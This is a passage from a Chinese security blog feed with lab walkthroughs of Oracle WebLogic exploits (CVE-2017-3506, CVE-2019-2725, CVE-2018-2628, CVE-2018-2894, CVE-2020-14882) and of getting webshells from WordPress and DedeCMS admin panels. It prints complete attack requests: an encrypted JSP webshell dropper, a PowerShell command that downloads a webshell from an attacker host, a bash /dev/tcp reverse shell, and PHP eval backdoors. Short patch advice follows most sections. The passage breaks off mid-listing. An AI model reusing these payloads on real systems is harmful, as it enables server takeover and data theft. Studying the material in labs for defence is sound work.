src="/2021/12/09/day36/image-20211226184826105.png" alt="image-20211226184826105"></p><p>存放了一些弱口令</p><pre class="line-numbers language-none"><code class="language-none">http://cirt.net/passwords?criteria=weblogic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>weblogic/Oracle@123登陆后台</p><p><img src="/2021/12/09/day36/image-20211226185313233.png" alt="image-20211226185313233"></p><p>这里显然是一个可以利用上传war包的点，安装-上传文件</p><p><img src="/2021/12/09/day36/image-20211226190225428.png" alt="image-20211226190225428"></p><p>成功用冰蝎连接了</p><h4 id="修复-25"><a href="#修复-25" class="headerlink" title="修复"></a>修复</h4><p>使用强口令</p><h3 id="XMLDecoder反序列化漏洞-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞(CVE-2017-3506)"></a>XMLDecoder反序列化漏洞(CVE-2017-3506)</h3><h4 id="原理-24"><a href="#原理-24" class="headerlink" title="原理"></a>原理</h4><p>构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞</p><p>影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</p><h4 id="复现-26"><a href="#复现-26" class="headerlink" title="复现"></a>复现</h4><p>访问以下目录中的一种，如果存在回显，说明可能存在此漏洞</p><pre class="line-numbers language-none"><code class="language-none">/wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226190631420.png" alt="image-20211226190631420"></p><p>构造好要放松的post包</p><pre class="line-numbers language-none"><code class="language-none">POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 192.168.80.132:7001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/hAccept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: text/xml Content-Length: 1228 &lt;soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt; &lt;object class="java.io.PrintWriter"&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method="println"&gt;&lt;string&gt; &lt;![CDATA[ &lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class Uextends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")) {String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta nce().equals(pageContext);}%&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method="close"/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交</p><p>访问后门地址</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.132:7001/bea_wls_internal/test.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211226192827657.png" alt="image-20211226192827657"></p><h4 id="修复-26"><a href="#修复-26" class="headerlink" title="修复"></a>修复</h4><ol><li><p>更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制</p></li><li><p>或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：</p><pre class="line-numbers language-none"><code class="language-none">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsatMiddleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.warMiddleware/wlserver_10.3/server/lib/wls-wsat.war<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a href="http://weblogic_ip/wls-wsat/">http://weblogic_ip/wls-wsat/</a> 是否为404页面</p></li></ol><h3 id="wls-wsat反序列化漏洞-CVE-2019-2725"><a href="#wls-wsat反序列化漏洞-CVE-2019-2725" class="headerlink" title="wls-wsat反序列化漏洞(CVE-2019-2725)"></a>wls-wsat反序列化漏洞(CVE-2019-2725)</h3><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞</p><h4 id="原理-25"><a href="#原理-25" class="headerlink" title="原理"></a>原理</h4><p>根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><p>影响版本：</p><p>weblogic 10.x</p><p>weblogic 12.1.3</p><h4 id="复现-27"><a href="#复现-27" class="headerlink" title="复现"></a>复现</h4><p>漏洞存在于：/_async/AsyncResponseService，访问地址，如果可以访问则存在漏洞：</p><p><img src="/2021/12/09/day36/image-20211226194549297.png" alt="image-20211226194549297"></p><p>我们构造包含poc的burppost包，来做到下载远程后门到指定目录</p><pre class="line-numbers language-none"><code class="language-none">POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.80.132:7001 Content-Length: 910 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;cmd&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;/c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;powershell(new-object System.Net.WebClient).DownloadFile('http://192.168.0.182:81/shell.jsp.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp ')&lt;/string&gt; &lt;/void&gt;&lt;/array&gt; &lt;void method="start"/&gt;&lt;/void&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交后</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.132:7001/_async/webshell.jsp <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接后门</p><p><img src="/2021/12/09/day36/image-20211226194919962.png" alt="image-20211226194919962"></p><h4 id="修复-27"><a href="#修复-27" class="headerlink" title="修复"></a>修复</h4><ol><li>禁用bea_wls9_async_response组件</li><li>删除wls9_async_response的war包并重启</li><li>禁止访问 /_async/* 路径。</li></ol><h3 id="T3协议反序列化命令执行漏洞-CVE-2018-2628"><a href="#T3协议反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="T3协议反序列化命令执行漏洞(CVE-2018-2628)"></a>T3协议反序列化命令执行漏洞(CVE-2018-2628)</h3><h4 id="原理-26"><a href="#原理-26" class="headerlink" title="原理"></a>原理</h4><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. </p><p>攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击</p><h4 id="复现-28"><a href="#复现-28" class="headerlink" title="复现"></a>复现</h4><p>起来环境</p><p><img src="/2021/12/09/day36/image-20211227102452047.png" alt="image-20211227102452047"></p><p>kaliz中下载poc</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/jas502n/CVE-2018-2628.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地起来这个工具</p><p><img src="/2021/12/09/day36/image-20211227102559416.png" alt="image-20211227102559416"></p><p>可以看到给出了一个shell位置</p><p>在poc目录下执行命令，用于连接shell</p><pre class="line-numbers language-none"><code class="language-none">python getshell\ cve-2018-2628.py <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行完后填写shell地址可以看到反弹了</p><p><img src="/2021/12/09/day36/image-20211227103744511.png" alt="image-20211227103744511"></p><h4 id="修复-28"><a href="#修复-28" class="headerlink" title="修复"></a>修复</h4><ol><li>及时更新补丁</li><li>禁用T3协议</li><li>禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</li></ol><h3 id="文件上传-CVE-2018-2894"><a href="#文件上传-CVE-2018-2894" class="headerlink" title="文件上传(CVE-2018-2894)"></a>文件上传(CVE-2018-2894)</h3><p>Weblogic Web Service Test Page中存在任意文件上传漏洞，Web ServiceTest Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。</p><p>两个页面分别为/ws_utc/begin.do和/ws_utc/config.do。</p><h4 id="原理-27"><a href="#原理-27" class="headerlink" title="原理"></a>原理</h4><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><h4 id="复现-29"><a href="#复现-29" class="headerlink" title="复现"></a>复现</h4><p>再靶机里打开vulhub的docker环境</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/weblogic/CVE-2018-2894sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果失败，排除网络问题，可能是没安装compose，安装compose</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install docker-compose <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227145822767.png" alt="image-20211227145822767"></p><p><img src="/2021/12/09/day36/image-20211227145846145.png" alt="image-20211227145846145"></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/console/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227150332458.png" alt="image-20211227150332458"></p><p>可以看到环境起来了</p><p>这里我们需要登录，我们在靶机获取下 账号密码</p><pre class="line-numbers language-none"><code class="language-none">sudo docker-compose logs | grep password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227150610782.png" alt="image-20211227150610782"></p><p>weblogic  登录</p><p><img src="/2021/12/09/day36/image-20211227151107804.png" alt="image-20211227151107804"></p><p>base_domain，高级，在  启用web服务测试页  选项打勾， 保存</p><p><img src="/2021/12/09/day36/image-20211227151247335.png" alt="image-20211227151247335"></p><p>在此开发环境下有俩个测试页，分别为 config.do 和 begin.do</p><h5 id="config-do页面"><a href="#config-do页面" class="headerlink" title="config.do页面"></a>config.do页面</h5><p>首先进入config.do，<strong>将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无需权限的</strong></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/config.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227152450020.png" alt="image-20211227152450020"></p><p>路径</p><pre class="line-numbers language-none"><code class="language-none">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交后，保存成功</p><p>然后我们在安全这里点添加，可以看到可上传文件，这里上传一个冰蝎的jsp后门</p><p><img src="/2021/12/09/day36/image-20211227152833846.png" alt="image-20211227152833846"></p><p>上传成功后我们需要知道连接的路径，抓包试试</p><p><img src="/2021/12/09/day36/image-20211227153621563.png" alt="image-20211227153621563"></p><p>猜测它上传上去的文件名 是时间戳_文件名</p><p>我们猜测出上传路径</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/css/config/keystore/1640590531080_shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227154226664.png" alt="image-20211227154226664"></p><p>尝试连接</p><p><img src="/2021/12/09/day36/image-20211227154258429.png" alt="image-20211227154258429"></p><p>可以看到连接成功</p><h5 id="begin-do页面"><a href="#begin-do页面" class="headerlink" title="begin.do页面"></a>begin.do页面</h5><p>接下来我们看看另一个页面begin.do</p><p>我们还是使用ws_utc应用的静态文件css目录</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/begin.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入刚才的账号密码，跳转到此页面</p><p><img src="/2021/12/09/day36/image-20211227154749801.png" alt="image-20211227154749801"></p><p>很轻易的发现右上角有个类似文件的东西，点击发现了上传点</p><p>上传后发现提示出错，我们f12 网络，在相应里可以找到一个上传路径</p><p><img src="/2021/12/09/day36/image-20211227155757908.png" alt="image-20211227155757908"></p><p>我们构造得到连接路径</p><p><img src="/2021/12/09/day36/image-20211227160039884.png" alt="image-20211227160039884"></p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/css/upload/RS_Upload_2021-12-27_08-01-39_776/import_file_name_shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227160506346.png" alt="image-20211227160506346"></p><h4 id="修复-29"><a href="#修复-29" class="headerlink" title="修复"></a>修复</h4><p>使用强密码</p><h3 id="远程代码执行漏洞-CVE-2020-14882"><a href="#远程代码执行漏洞-CVE-2020-14882" class="headerlink" title="远程代码执行漏洞(CVE-2020-14882)"></a>远程代码执行漏洞(CVE-2020-14882)</h3><h4 id="原理-28"><a href="#原理-28" class="headerlink" title="原理"></a>原理</h4><p>通过发送恶意的HTTP GET 请求，攻击者可在<strong>未经身份验证的情况下</strong>控制 WebLogic Server Console ，并执行任意代码。</p><p>影响版本：</p><p>Oracle Weblogic Server 10.3.6.0.0 </p><p>Oracle Weblogic Server 12.1.3.0.0 </p><p>Oracle Weblogic Server 12.2.1.3.0 </p><p>Oracle Weblogic Server 12.2.1.4.0 </p><p>Oracle Weblogic Server 14.1.1.0.0 </p><h4 id="复现-30"><a href="#复现-30" class="headerlink" title="复现"></a>复现</h4><p>进入路径下开启docker</p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/weblogic/CVE-2020-14882sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启后访问</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/console/login/LoginForm.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227162648120.png" alt="image-20211227162648120"></p><p>构造url进行未授权访问</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227163137095.png" alt="image-20211227163137095"></p><p>可以看到进来了console，这里看到权限并不是很高，不能上传文件之类的</p><p>这里我们先测试一下，在/tmp下创建一个test文件</p><p>我们这里先进入到/tmp</p><pre class="line-numbers language-none"><code class="language-none">sudo docker exec -it cve202014882_weblogic_1 /bin/bashls /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227164108212.png" alt="image-20211227164108212"></p><p>构造url</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test%27);%22);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里虽然404，但是命令执行了</p><p><img src="/2021/12/09/day36/image-20211227165535536.png" alt="image-20211227165535536"></p><p>接下来我们在kali创建一个xml文件，使用bash命令反弹shell</p><p>下面的ip换成kali的ip</p><pre class="line-numbers language-none"><code class="language-none">reverse-bash.xml &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;/bin/bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.80.134/99990&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>监听9999端口</p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造url</p><pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.80.134/reverse-bash.xml")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211227171838797.png" alt="image-20211227171838797"></p><p>反弹出shell</p><h4 id="修复-30"><a href="#修复-30" class="headerlink" title="修复"></a>修复</h4><ol><li><p>打补丁</p><pre class="line-numbers language-none"><code class="language-none">https://www.oracle.com/security-alerts/cpuapr2020.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>但是该漏洞的补丁存在被绕过的风险，建议临时关闭后台/console/console.portal的对外访问。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站后台getshell</title>
      <link href="/2021/12/04/day35/"/>
      <url>/2021/12/04/day35/</url>
      
        <content type="html"><![CDATA[<h1 id="网站后台getshell"><a href="#网站后台getshell" class="headerlink" title="网站后台getshell"></a>网站后台getshell</h1><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>通过注入或者其他途径，获取网站管理员账号和密码后，找到后台登录地址，登录后，寻找后台漏洞上传网页后门，获取网站的webshell</p><p>webshell的作用是方便攻击者，webshell是拥有fso权限，根据fso权限的不同，可以对网页进行编辑，删除，上传或者下载，查看文件。</p><p>攻击者也可以通过这个webshell对服务器进行提权，提权成功后，会得到服务器管理权限。</p><p>拿webshell也叫getshell。</p><h2 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h2><p>网站后台的因为功模块较多，很多开发人员也不会对后台的业务输入，进行严格过滤，输入有危害的内容，与漏洞配合很容易拿到网站的webshell。</p><p>可以通过文件上传漏洞、SQL注入漏洞、文件任意写入漏洞、文件远程下载漏洞，SQL语句执行漏洞、数据库备份漏洞，文件包含漏洞等漏洞获取网站的webshell。</p><p>根据利用的漏洞类型分为：</p><ul><li><p>模板编辑拿webshell</p><p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。</p></li><li><p>文件上传拿webshell</p><p>通过后台的上传模块，上传网页后门，就可以拿到webshell</p></li><li><p>文件写入拿webshell</p><p>通过可控参数将恶意代码写入文件里，即可获取webshell</p></li><li><p>zip自解压拿webshell</p><p>上传zip文件，在其加入webshell文件，程序会自动解压，将后门解压到网站目录，可以获取webshell。</p></li><li><p>远程图片下载拿webshell</p><p>有的网站后台会存在远程图片下载功能，但是没有对其后缀名进行限制，导致可以下去webshell文件。</p></li><li><p>编辑器漏洞拿webshell</p><p>有的编辑器存在上传漏洞，通过编辑器漏洞可以获取网站的webshell。</p></li><li><p>备份拿webshell</p><p>很多的asp网站 都存在备份功能，上传有恶意的图片，备份成脚本文件，即可获取webshell</p></li><li><p>SQL语句执行拿webshell</p><p>有的网站存在sql执行命令，可以通过命令备份或导出一句话后门到指定网站目录，即可获取webshell</p></li><li><p>SQL注入写shell 拿webshell</p><p>网站前台设置了防注入，但是后台一般都存在注入，如果权限有读写，使用命令进行读写文件，或者执行写入后门，即可获取webshell</p></li></ul><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="word-press后台-getshell"><a href="#word-press后台-getshell" class="headerlink" title="word press后台 getshell"></a>word press后台 getshell</h3><p>我们先登陆后台</p><p>后台路径</p><pre class="line-numbers language-none"><code class="language-none">www.cbi1.com/wp-admin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211204104306909.png" alt="image-20211204104306909"></p><p>admin 123456 登录进入后台管理</p><h4 id="修改模板getshell"><a href="#修改模板getshell" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>接下来我们进入 外观 主题 编辑 </p><p><img src="/2021/12/04/day35/image-20211204104541910.png" alt="image-20211204104541910"></p><p>我们通过写入php一句话方式getshell，看到404模板为php后缀文件，所以我们在此加入一句话会被解析执行。</p><pre class="line-numbers language-none"><code class="language-none">一句话&lt;?php phpinfo();eval($_POST['123']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211204105007809.png" alt="image-20211204105007809"></p><p>在靶机上我们查看文件发现一句话确实被写入了</p><p><img src="/2021/12/04/day35/image-20211204110538620.png" alt="image-20211204110538620"></p><pre class="line-numbers language-none"><code class="language-none">路径www.cbi1.com\wp-content\themes\twentysixteen\404.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看到phpinfo语句被执行</p><p><img src="/2021/12/04/day35/image-20211204110603509.png" alt="image-20211204110603509"></p><p>用蚁剑也能连接上</p><p><img src="/2021/12/04/day35/image-20211204110806317.png" alt="image-20211204110806317"></p><h4 id="zip自解压getshell"><a href="#zip自解压getshell" class="headerlink" title="zip自解压getshell"></a>zip自解压getshell</h4><p>进入后台管理后，在外观 主题 下发现可上传主题</p><p><img src="/2021/12/04/day35/image-20211204110950993.png" alt="image-20211204110950993"></p><p>在事先准备好的主题下写入一句话，然后压缩为zip格式上传即可</p><p><img src="/2021/12/04/day35/image-20211204111258930.png" alt="image-20211204111258930"></p><p>可看到上传上去了</p><pre class="line-numbers language-none"><code class="language-none">路径http://www.cbi1.com/wp-content/themes/moon/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可看到phpinfo信息</p><p><img src="/2021/12/04/day35/image-20211204111555067.png" alt="image-20211204111555067"></p><p>连接也可成功</p><p><img src="/2021/12/04/day35/image-20211204111636883.png" alt="image-20211204111636883"></p><h3 id="dedecms后台-getshell"><a href="#dedecms后台-getshell" class="headerlink" title="dedecms后台 getshell"></a>dedecms后台 getshell</h3><p>首先还是要进入后台</p><pre class="line-numbers language-none"><code class="language-none">路径http://www.cbi2.com/dede/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211204114057624.png" alt="image-20211204114057624"></p><p>admin 123456 进入后台管理</p><h4 id="文件上传-getshell"><a href="#文件上传-getshell" class="headerlink" title="文件上传 getshell"></a>文件上传 getshell</h4><p>进入后台后发现附件管理里有个上传新文件，点击后发现限制了后缀</p><p><img src="/2021/12/04/day35/image-20211204114255073.png" alt="image-20211204114255073"></p><p>然而点击文件式管理器后，发现也可上传文件且没有限制</p><p>我们准备好一句话上传上去</p><p><img src="/2021/12/04/day35/image-20211204114521600.png" alt="image-20211204114521600"></p><pre class="line-numbers language-none"><code class="language-none">路径http://www.cbi2.com/uploads/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/04/day35/image-20211204114452199.png" alt="image-20211204114452199"></p><p><img src="/2021/12/04/day35/image-20211204114653835.png" alt="image-20211204114653835"></p><h4 id="修改模板getshell-1"><a href="#修改模板getshell-1" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>我们在模板 默认模板管理里发现可以修改模板</p><p><img src="/2021/12/04/day35/image-20211204114936335.png" alt="image-20211204114936335"></p><p>但是里面的都是htm后缀，我们如果加入php一句话显然不会被作为php代码解析</p><p>接着我们在生成里发现了更新主页htm，我们可以把主页htm后缀改为php后缀，即可解决一句话不解析的问题</p><p>在index.htm模板里加入一句话</p><p><img src="/2021/12/04/day35/image-20211204120913107.png" alt="image-20211204120913107"></p><p>在生成里更改主页的后缀</p><p><img src="/2021/12/04/day35/image-20211204121003150.png" alt="image-20211204121003150"></p><p>访问index.php，看到一句话被作为php解析了</p><p><img src="/2021/12/04/day35/image-20211204121020685.png" alt="image-20211204121020685"></p><h4 id="任意命令执行getshell"><a href="#任意命令执行getshell" class="headerlink" title="任意命令执行getshell"></a>任意命令执行getshell</h4><p>代码审计后发现此方法</p><p>登录后台后，我们在模块里发现广告管理 增加广告中可以写入代码</p><p>我们写入一句话</p><p><img src="/2021/12/04/day35/image-20211204121556743.png" alt="image-20211204121556743"></p><p>写入了</p><p><img src="/2021/12/04/day35/image-20211204121714512.png" alt="image-20211204121714512"></p><pre class="line-numbers language-none"><code class="language-none">路径http://www.cbi2.com/plus/ad_js.php?aid=5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进行连接</p><pre class="line-numbers language-none"><code class="language-none">这里写入的一句话内容&lt;?php phpinfo();eval($_POST['123']);?&gt;但是无法用蚁剑连接，把post里的引号去掉，发现可以连接了&lt;?php phpinfo();eval($_POST[123]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里的一句话是写入数据库，所以引号会报错</p></blockquote><p>可以看到拿到了webshell</p><p><img src="/2021/12/04/day35/image-20211205131348554.png" alt="image-20211205131348554"></p><p>分析源码 这是在网站里找到的广告调用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * * 广告JS调用方式 * * @version        $Id: ad_js.php 1 20:30 2010年7月8日Z $ * @package        DedeCMS.Site * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc. * @license        http://help.dedecms.com/usersguide/license.html * @link           http://www.dedecms.com */</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/../include/common.inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$arcID</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token variable">$arcID</span><span class="token punctuation">;</span><span class="token variable">$arcID</span> <span class="token operator">=</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$aid</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Request Error! '</span><span class="token 